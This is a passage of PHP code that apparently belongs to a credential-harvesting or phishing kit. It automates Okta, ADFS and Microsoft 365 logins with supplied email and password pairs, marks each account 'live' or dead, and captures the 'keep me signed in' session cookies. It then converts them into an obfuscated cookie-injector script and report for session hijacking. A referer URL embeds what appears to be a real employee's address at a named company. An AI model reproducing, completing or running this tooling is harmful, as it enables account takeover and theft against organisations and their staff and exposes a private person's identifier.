					'referer' => $main_url.'app/office365/kqkxvmSNVXRTFTDOGESI/sso/wsfed/passive?client-request-id=f881bf82-50b3-42e5-becb-1d5df4b67e2f&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZJNiON0GMab6UxnpqhbRpH1IMzBg4hp__lOBxZsmk6atmk--pmglKZJ27T_JE2bJpkcRL0oiLDnPXqcPSgKIgrqTRhB9ryHRYS97EFk2YURL3b1vHh5ed7nfd7T88sfMkWqiBXBW1m8CM7eIBmaIknKRAl8QqNk2QQoS9g0illlYnfCGXoyXp_kCx_9-OH118pD7odfXn_vyTfvly6R03kYrjZnpVIcx0V_OnUmdnHiuyU49izHm0X4twhyD0Hu7B3YHtrrXO5taIJlAEYzLE3iLAEwChT1BQeNheXqCzGUcInUHQDavIi3uktgLCqhlEqJ3q1RUjpLpbRCGsLOWRi7vBrKvE5KVQAMwYCtgUjs_kN5oFJtvu3KgogZA825v3dDrmzDOf5s-GsntR_vHU_9tTta-ZvwTvbuHjNrJMp4IfbNloNOBL_XKJOc5kqmsho0umJVXSwEh9OqbnVYV5vbc1Wyt0ys7KRLJgneIebDOcstg0pES53zese8iJbDAHIsILieZPEoeh5TXLVfGcc92bMhDGoquWUC2EFFti1c8HovTvxYmSt8HVABG-kardb6Vl9OxzM8ARWAm61mErRTeaOnGl8n5XYPO2_Im00HCjMgygEFaRIdVCySwIG0HfB1X8CDaWSp6Igup7FGbqBkdTquEoniVB1H3bgdsH6TNqJBYraCkWJQvFSDeG1ll6Ng0AguAlPW25jONLn6QO1isBezjOJfZl97TucR_lU2txOu711lGX9le451ulr7Uwfaz-Mkwkvyv1vdd-1iBcLfsyeLaOzNbBu-M3Zntvcsdm8febT_6tFh4eAmcpp58xWQPTs6yhcyNzOnmet95PODHZsfmN9_9rRf5j5-rDz8dfRu5uqgtKsmGTotYRLo5Zq9TrXQksTp0Fw2WpDC5fWwr2EzwpiXcf0Wc4bdziG3c7mr3LHIj9q1LjsCf-aQTw4z3x3_L-X3X3g5n986I-hPxtDenPxH-08vZq5f-vvB3U-_-OvnP-qPbrztVjC6q_RlgtU2mIHNllBJbQ2ETNPzecwr1boCbghBkKS9W18WMr8VMv8A0&cbcxt=&username=jvangeel%40amgen.com&mkt=en-US&lc=',
					'sec-ch-ua' => '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
					'sec-ch-ua-mobile' => '?0',
					'sec-ch-ua-platform' => '"Windows"',
					'sec-ch-ua-platform-version' => '"15.0.0"',
					'sec-fetch-dest' => 'empty',
					'sec-fetch-mode' => 'cors',
					'sec-fetch-site' => 'same-origin',
					'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
					'x-okta-user-agent-extended' => 'okta-auth-js/7.9.0 okta-signin-widget-7.26.1'
				],
				'json' => [  // Use 'json' instead of 'form_params' to send JSON data
					'authenticator' => [
						'id' => $id
					],
					'stateHandle' => $stateHandle
				]
			]);
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
			// You can get the content with:
			$result = $response->getBody()->getContents();

			$result = json_decode($result, true);

			$stateHandle = $result['stateHandle'];
			

			try {
				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);

				$response = $client->request('POST', $main_url.'idp/idx/challenge/answer', [
					'headers' => [
						'accept' => 'application/ion+json; okta-version=1.0.0',
						'accept-language' => 'en',
						'content-type' => 'application/ion+json; okta-version=1.0.0',
						'origin' => $main_url,
						'priority' => 'u=1, i',
						'referer' => $main_url.'app/office365/kqkxvmSNVXRTFTDOGESI/sso/wsfed/passive?client-request-id=f881bf82-50b3-42e5-becb-1d5df4b67e2f&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZJNiON0GMab6UxnpqhbRpH1IMzBg4hp__lOBxZsmk6atmk--pmglKZJ27T_JE2bJpkcRL0oiLDnPXqcPSgKIgrqTRhB9ryHRYS97EFk2YURL3b1vHh5ed7nfd7T88sfMkWqiBXBW1m8CM7eIBmaIknKRAl8QqNk2QQoS9g0illlYnfCGXoyXp_kCx_9-OH118pD7odfXn_vyTfvly6R03kYrjZnpVIcx0V_OnUmdnHiuyU49izHm0X4twhyD0Hu7B3YHtrrXO5taIJlAEYzLE3iLAEwChT1BQeNheXqCzGUcInUHQDavIi3uktgLCqhlEqJ3q1RUjpLpbRCGsLOWRi7vBrKvE5KVQAMwYCtgUjs_kN5oFJtvu3KgogZA825v3dDrmzDOf5s-GsntR_vHU_9tTta-ZvwTvbuHjNrJMp4IfbNloNOBL_XKJOc5kqmsho0umJVXSwEh9OqbnVYV5vbc1Wyt0ys7KRLJgneIebDOcstg0pES53zese8iJbDAHIsILieZPEoeh5TXLVfGcc92bMhDGoquWUC2EFFti1c8HovTvxYmSt8HVABG-kardb6Vl9OxzM8ARWAm61mErRTeaOnGl8n5XYPO2_Im00HCjMgygEFaRIdVCySwIG0HfB1X8CDaWSp6Igup7FGbqBkdTquEoniVB1H3bgdsH6TNqJBYraCkWJQvFSDeG1ll6Ng0AguAlPW25jONLn6QO1isBezjOJfZl97TucR_lU2txOu711lGX9le451ulr7Uwfaz-Mkwkvyv1vdd-1iBcLfsyeLaOzNbBu-M3Zntvcsdm8febT_6tFh4eAmcpp58xWQPTs6yhcyNzOnmet95PODHZsfmN9_9rRf5j5-rDz8dfRu5uqgtKsmGTotYRLo5Zq9TrXQksTp0Fw2WpDC5fWwr2EzwpiXcf0Wc4bdziG3c7mr3LHIj9q1LjsCf-aQTw4z3x3_L-X3X3g5n986I-hPxtDenPxH-08vZq5f-vvB3U-_-OvnP-qPbrztVjC6q_RlgtU2mIHNllBJbQ2ETNPzecwr1boCbghBkKS9W18WMr8VMv8A0&cbcxt=&username=jvangeel%40amgen.com&mkt=en-US&lc=',
						'sec-ch-ua' => '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
						'sec-ch-ua-mobile' => '?0',
						'sec-ch-ua-platform' => '"Windows"',
						'sec-ch-ua-platform-version' => '"15.0.0"',
						'sec-fetch-dest' => 'empty',
						'sec-fetch-mode' => 'cors',
						'sec-fetch-site' => 'same-origin',
						'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
						'x-device-fingerprint' => '3KEY0RzvhyoLFTuUSJsviMYZJRx8Clq3|cf144fa15eb69228de7d99fee2dcc645c0641f25be001d750918ca1a6200d0ba|6f33e35e5a3e4b0fd91d24f626d0736a',
						'x-okta-user-agent-extended' => 'okta-auth-js/7.9.0 okta-signin-widget-7.26.1'
					],
					'json' => [  // Use 'json' instead of 'form_params' to send JSON data
						'credentials' => [
							'passcode' => $this->password
						],
						'stateHandle' => $stateHandle
					]
				]);
		
				// You can get the content with:
				$statusCode = $response->getStatusCode();
			
				if ($statusCode == 200) {
					$result = $response->getBody()->getContents();

					$result = json_decode($result, true);
					$redirect = $result['success']['href'];
					
					$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
					$client = new Client([
						'cookies' => $cookieJar,
					]);
					// Perform KMSI request
					$response = $client->request('POST', $redirect, [
						'headers' => [
							'accept' => 'application/ion+json; okta-version=1.0.0',
							'accept-language' => 'en',
							'content-type' => 'application/ion+json; okta-version=1.0.0',
							'origin' => $main_url,
							'priority' => 'u=1, i',
							'referer' => $main_url.'app/office365/kqkxvmSNVXRTFTDOGESI/sso/wsfed/passive?client-request-id=f881bf82-50b3-42e5-becb-1d5df4b67e2f&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZJNiON0GMab6UxnpqhbRpH1IMzBg4hp__lOBxZsmk6atmk--pmglKZJ27T_JE2bJpkcRL0oiLDnPXqcPSgKIgrqTRhB9ryHRYS97EFk2YURL3b1vHh5ed7nfd7T88sfMkWqiBXBW1m8CM7eIBmaIknKRAl8QqNk2QQoS9g0illlYnfCGXoyXp_kCx_9-OH118pD7odfXn_vyTfvly6R03kYrjZnpVIcx0V_OnUmdnHiuyU49izHm0X4twhyD0Hu7B3YHtrrXO5taIJlAEYzLE3iLAEwChT1BQeNheXqCzGUcInUHQDavIi3uktgLCqhlEqJ3q1RUjpLpbRCGsLOWRi7vBrKvE5KVQAMwYCtgUjs_kN5oFJtvu3KgogZA825v3dDrmzDOf5s-GsntR_vHU_9tTta-ZvwTvbuHjNrJMp4IfbNloNOBL_XKJOc5kqmsho0umJVXSwEh9OqbnVYV5vbc1Wyt0ys7KRLJgneIebDOcstg0pES53zese8iJbDAHIsILieZPEoeh5TXLVfGcc92bMhDGoquWUC2EFFti1c8HovTvxYmSt8HVABG-kardb6Vl9OxzM8ARWAm61mErRTeaOnGl8n5XYPO2_Im00HCjMgygEFaRIdVCySwIG0HfB1X8CDaWSp6Igup7FGbqBkdTquEoniVB1H3bgdsH6TNqJBYraCkWJQvFSDeG1ll6Ng0AguAlPW25jONLn6QO1isBezjOJfZl97TucR_lU2txOu711lGX9le451ulr7Uwfaz-Mkwkvyv1vdd-1iBcLfsyeLaOzNbBu-M3Zntvcsdm8febT_6tFh4eAmcpp58xWQPTs6yhcyNzOnmet95PODHZsfmN9_9rRf5j5-rDz8dfRu5uqgtKsmGTotYRLo5Zq9TrXQksTp0Fw2WpDC5fWwr2EzwpiXcf0Wc4bdziG3c7mr3LHIj9q1LjsCf-aQTw4z3x3_L-X3X3g5n986I-hPxtDenPxH-08vZq5f-vvB3U-_-OvnP-qPbrztVjC6q_RlgtU2mIHNllBJbQ2ETNPzecwr1boCbghBkKS9W18WMr8VMv8A0&cbcxt=&username=jvangeel%40amgen.com&mkt=en-US&lc=',
							'sec-ch-ua' => '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
							'sec-ch-ua-mobile' => '?0',
							'sec-ch-ua-platform' => '"Windows"',
							'sec-ch-ua-platform-version' => '"15.0.0"',
							'sec-fetch-dest' => 'empty',
							'sec-fetch-mode' => 'cors',
							'sec-fetch-site' => 'same-origin',
							'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
							'x-device-fingerprint' => '3KEY0RzvhyoLFTuUSJsviMYZJRx8Clq3|cf144fa15eb69228de7d99fee2dcc645c0641f25be001d750918ca1a6200d0ba|6f33e35e5a3e4b0fd91d24f626d0736a',
							'x-okta-user-agent-extended' => 'okta-auth-js/7.9.0 okta-signin-widget-7.26.1'
						],
						'json' => [  // Use 'json' instead of 'form_params' to send JSON data
							'stateToken' => $stateHandle
						]
					]);

					$result = $response->getBody()->getContents();
								
					preg_match('/<input\s+name=["\']wctx["\'][^>]*\s+value=["\']([^"\']+)["\']/', $result, $wctx);
					$wctx = html_entity_decode($wctx[1]);

					preg_match('/<input\s+name=["\']wresult["\'][^>]*\s+value=["\']([^"\']+)["\']/', $result, $wresult);
					$wresult = html_entity_decode($wresult[1]);

					if ($this->currentDirectory . '/cookie_' . $this->email . '.txt') {
						unlink($this->currentDirectory . '/cookie_' . $this->email . '.txt');
					}
					
					$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // Adjust the path as needed

					$client = new Client([
						'cookies' => $cookieJar,
					]);

					$response = $client->post('https://login.microsoftonline.com/login.srf', [
						'headers' => [
							'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
							'Accept-Language' => 'en-US,en;q=0.9',
							'Cache-Control' => 'max-age=0',
							'Connection' => 'keep-alive',
							'Content-Type' => 'application/x-www-form-urlencoded',
							'Origin' => 'null',
							'Sec-Fetch-Dest' => 'document',
							'Sec-Fetch-Mode' => 'navigate',
							'Sec-Fetch-Site' => 'cross-site',
							'Upgrade-Insecure-Requests' => '1',
							'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Edg/130.0.0.0',
							'X-Edge-Shopping-Flag' => '0',
							'sec-ch-ua' => '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
							'sec-ch-ua-mobile' => '?1',
							'sec-ch-ua-platform' => '"Android"',
							'sec-ch-ua-platform-version' => '"6.0"',
						],
						'form_params' => [
							'wctx' => $wctx,
							'wa' => 'wsignin1.0',
							'wresult' => $wresult, // Truncated for brevity
							'wtrealm' => 'urn:federation:MicrosoftOnline',
						],
					]);
					$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

					// You can get the content with:
					$result = $response->getBody()->getContents();

					preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
					preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
					preg_match('/(?<="canary":")[^"]*/', $result, $canary);
					preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
					preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
					preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

					$this->sFT = $sFT[0];
					$this->sCtx = $sCtx[0];
					$this->canary = $canary[0];
					$this->api_canary = $api_canary[0];
					$this->session_id = $session_id[0];
					$this->request_id = $request_id[0];


					$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

					// Create a Guzzle client with the cookie jar
					$client = new Client([
						'cookies' => $cookieJar,
					]);

					$response = $client->post('https://login.microsoftonline.com/appverify', [
						'headers' => [
							'Connection' => 'keep-alive',
							'Cache-Control' => 'no-cache',
							'Upgrade-Insecure-Requests' => '1',
							'Origin' => 'null',
							'Content-Type' => 'application/x-www-form-urlencoded',
							'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
							'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
							'Accept-Language' => 'en-US,en;q=0.9',
							'Referer' => '',
							'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						],
						'form_params' => [
							'ContinueAuth' => 'true',
							'ctx' => $this->sCtx,
							'hpgrequestid' => '1f12d14c-7a42-4542-be79-78f592f96800',
							'flowToken' => $this->sFT,
							'iscsrfspeedbump' => 'true',
							'canary' => $this->canary,
							'i19' => '4624',
						],
					]);

					$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

					$result = $response->getBody()->getContents();

					preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
					preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
					preg_match('/(?<="canary":")[^"]*/', $result, $canary);
					preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
					preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
					preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

					$this->sFT = $sFT[0];
					$this->sCtx = $sCtx[0];
					$this->canary = $canary[0];
					$this->api_canary = $api_canary[0];
					$this->session_id = $session_id[0];
					$this->request_id = $request_id[0];

					$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
					$client = new Client([
						'cookies' => $cookieJar,
					]);
					// Perform KMSI request
					$response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
						'headers' => [
							'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
							'Accept-Language' => 'en-US,en;q=0.9',
							'Cache-Control' => 'max-age=0',
							'Content-Type' => 'application/x-www-form-urlencoded',
							'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
							'Origin' => 'https://login.microsoftonline.com',
							'Referer' => 'https://login.microsoftonline.com/common/login',
							'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
							'Sec-CH-UA-Mobile' => '?0',
							'Sec-CH-UA-Platform' => '"Windows"',
							'Sec-Fetch-Dest' => 'document',
							'Sec-Fetch-Mode' => 'navigate',
							'Sec-Fetch-Site' => 'same-origin',
							'Sec-Fetch-User' => '?1',
							'Upgrade-Insecure-Requests' => '1',
							'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
						],
						'form_params' => [
							'LoginOptions' => '1',
							'type' => '28',
							'ctx' => $this->sCtx,
							'hpgrequestid' => $this->request_id,
							'flowToken' => $this->sFT,
							'DontShowAgain' => 'true',
							'canary' => $this->canary,
							'i19' => '14108',
						]
					]);
					$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
		
					// You can get the content with:
					$result = $response->getBody()->getContents();
					$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

					// Obfuscate and store the cookie
					$cookiejs =
					$this->generateInjectorScript($cookie);

					file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
					$this->saveHtmlReport($cookie, $cookiejs, 'okta');
				}else{
					$this->status['live'] = false;
					return;
				}

			} catch (ClientException $e) {
				$this->status['live'] = false;
				return;
			}
	    }

	    private function AuthRedirect(){
			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

			$client = new Client([
				'cookies' => $cookieJar, // Include cookie jar for persistence
			]);
	
			// Send POST request
			$response = $client->post($this->status['redirect'], [
				'headers' => [
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Cache-Control' => 'max-age=0',
					'Connection' => 'keep-alive',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'Origin' => 'https://fs2.tu.ac.th',
					'Referer' => $this->status['redirect'],
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'same-origin',
					'Sec-Fetch-User' => '?1',
					'Upgrade-Insecure-Requests' => '1',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
					'Sec-Ch-Ua' => '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
					'Sec-Ch-Ua-Mobile' => '?0',
					'Sec-Ch-Ua-Platform' => '"Windows"',
				],
				'form_params' => [
					'UserName' => $this->email,
					'Password' => $this->password,
					'AuthMethod' => 'FormsAuthentication',
				],
			]);
	
			// Save cookies
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
			// Get the content of the response
			$result = $response->getBody()->getContents();
			
		    if (strpos($result, 'Incorrect user ID or password.') !== false || strpos($result, "You don't have permission to access") !== false) {
				$this->status['live'] = false;
			}
			
			if (strpos($result, 'Working...') !== false){

				preg_match('/name=["\']?wctx["\']?\s+value=["\']?([^"\']+)["\']?/', $result, $wctx);
				$wctx = html_entity_decode($wctx[1]);

				preg_match('/name=["\']?wresult["\']?\s+value=["\']?([^"\']+)["\']?/', $result, $wresult);
				$wresult = html_entity_decode($wresult[1]);

				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // Adjust the path as needed

				$client = new Client([
					'cookies' => $cookieJar,
				]);

				$response = $client->post('https://login.microsoftonline.com/login.srf', [
					'headers' => [
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language' => 'en-US,en;q=0.9',
						'Cache-Control' => 'max-age=0',
						'Connection' => 'keep-alive',
						'Content-Type' => 'application/x-www-form-urlencoded',
						'Origin' => 'null',
						'Sec-Fetch-Dest' => 'document',
						'Sec-Fetch-Mode' => 'navigate',
						'Sec-Fetch-Site' => 'cross-site',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Edg/130.0.0.0',
						'X-Edge-Shopping-Flag' => '0',
						'sec-ch-ua' => '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
						'sec-ch-ua-mobile' => '?1',
						'sec-ch-ua-platform' => '"Android"',
						'sec-ch-ua-platform-version' => '"6.0"',
					],
					'form_params' => [
						'wctx' => $wctx,
						'wa' => 'wsignin1.0',
						'wresult' => $wresult, // Truncated for brevity
						'wtrealm' => 'urn:federation:MicrosoftOnline',
					],
				]);
				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				// You can get the content with:
				$result = $response->getBody()->getContents();

				preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
				preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
				preg_match('/(?<="canary":")[^"]*/', $result, $canary);
				preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
				preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
				preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

				$this->sFT = $sFT[0];
				$this->sCtx = $sCtx[0];
				$this->canary = $canary[0];
				$this->api_canary = $api_canary[0];
				$this->session_id = $session_id[0];
				$this->request_id = $request_id[0];


				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

				// Create a Guzzle client with the cookie jar
				$client = new Client([
					'cookies' => $cookieJar,
				]);

				$response = $client->post('https://login.microsoftonline.com/appverify', [
					'headers' => [
						'Connection' => 'keep-alive',
						'Cache-Control' => 'no-cache',
						'Upgrade-Insecure-Requests' => '1',
						'Origin' => 'null',
						'Content-Type' => 'application/x-www-form-urlencoded',
						'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language' => 'en-US,en;q=0.9',
						'Referer' => '',
						'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					],
					'form_params' => [
						'ContinueAuth' => 'true',
						'ctx' => $this->sCtx,
						'hpgrequestid' => '1f12d14c-7a42-4542-be79-78f592f96800',
						'flowToken' => $this->sFT,
						'iscsrfspeedbump' => 'true',
						'canary' => $this->canary,
						'i19' => '4624',
					],
				]);

				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				$result = $response->getBody()->getContents();

				preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
				preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
				preg_match('/(?<="canary":")[^"]*/', $result, $canary);
				preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
				preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
				preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

				$this->sFT = $sFT[0];
				$this->sCtx = $sCtx[0];
				$this->canary = $canary[0];
				$this->api_canary = $api_canary[0];
				$this->session_id = $session_id[0];
				$this->request_id = $request_id[0];

				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);
				// Perform KMSI request
				$response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
					'headers' => [
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language' => 'en-US,en;q=0.9',
						'Cache-Control' => 'max-age=0',
						'Content-Type' => 'application/x-www-form-urlencoded',
						'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						'Origin' => 'https://login.microsoftonline.com',
						'Referer' => 'https://login.microsoftonline.com/common/login',
						'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
						'Sec-CH-UA-Mobile' => '?0',
						'Sec-CH-UA-Platform' => '"Windows"',
						'Sec-Fetch-Dest' => 'document',
						'Sec-Fetch-Mode' => 'navigate',
						'Sec-Fetch-Site' => 'same-origin',
						'Sec-Fetch-User' => '?1',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
					],
					'form_params' => [
						'LoginOptions' => '1',
						'type' => '28',
						'ctx' => $this->sCtx,
						'hpgrequestid' => $this->request_id,
						'flowToken' => $this->sFT,
						'DontShowAgain' => 'true',
						'canary' => $this->canary,
						'i19' => '14108',
					]
				]);
				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
				// You can get the content with:
				$result = $response->getBody()->getContents();
				$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				// Obfuscate and store the cookie
				$cookiejs =
					$this->generateInjectorScript($cookie);

				file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
				$this->saveHtmlReport($cookie, $cookiejs);
			}else{
				$this->status['live'] = false;
			}
	    }

	    private function AuthDouble(){
		    $cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);
            $response = $client->post('https://login.microsoftonline.com/common/login', [
                'headers' => [
					'Connection'                => 'keep-alive',
					'Origin'                    => 'https://login.microsoftonline.com',
					'Content-Type'              => 'application/x-www-form-urlencoded',
					'User-Agent'                => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
					'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Sec-Fetch-Site'            => 'same-origin',
					'Sec-Fetch-Mode'            => 'navigate',
					'Sec-Fetch-User'            => '?1',
					'Sec-Fetch-Dest'            => 'document',
					'Referer'                   => 'https://login.microsoftonline.com',
					'Accept-Language'           => 'en-US,en;q=0.9',
					'Accept-Encoding'           => 'gzip, deflate, br',  // Handle compressed responses
					'Cookie'                    => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Upgrade-Insecure-Requests' => '1',  // Simulate request for upgrading any mixed content
					'TE'                        => 'Trailers',  // Sometimes required for proper connection handling
					'Cache-Control'             => 'max-age=0', // Prevents caching issues that may affect request behavior
					'Pragma'                    => 'no-cache', // Ensures no cached data interferes
					'Sec-Ch-Ua'                 => '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
					'Sec-Ch-Ua-Mobile'          => '?0',  // Indicates this is a desktop device
					'Sec-Ch-Ua-Platform'        => '"Windows"',
					'Sec-Ch-Ua-Platform-Version'=> '"10.0.22635"',  // Windows 10 version
				],
				'form_params' => [
					'i13'               => '0',
					'login'             => $this->email,
					'loginfmt'          => $this->email,
					'type'              => '11',
					'LoginOptions'      => '3',
					'lrt'               => '',
					'lrtPartition'      => '',
					'hisRegion'         => '',
					'hisScaleUnit'      => '',
					'passwd'            => $this->password,
					'ps'                => '2',
					'psRNGCDefaultType' => '',
					'psRNGCEntropy'     => '',
					'psRNGCSLK'         => '',
					'canary'            => $this->canary,
					'ctx'               => $this->sCtx,
					'hpgrequestid'      => 'a0686a42-206a-413d-b3ee-babbff250600',
					'flowToken'         => $this->sFT,
					'PPSX'              => '',
					'NewUser'           => '1',
					'FoundMSAs'         => '',
					'fspost'            => '0',
					'i21'               => '0',
					'CookieDisclosure'  => '0',
					'IsFidoSupported'   => '0',
					'isSignupPost'      => '0',
					'i19'               => '106975',
				]
            ]);
            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			// Get the content of the response
			$result = $response->getBody()->getContents();
        

			preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
		    preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
		    preg_match('/(?<="canary":")[^"]*/', $result, $canary);
		    preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
		    preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
		    preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

		    $this->sFT = $sFT[0];
		    $this->sCtx = $sCtx[0];
		    $this->canary = $canary[0];
		    $this->api_canary = $api_canary[0];
		    $this->session_id = $session_id[0];
		    $this->request_id = $request_id[0];

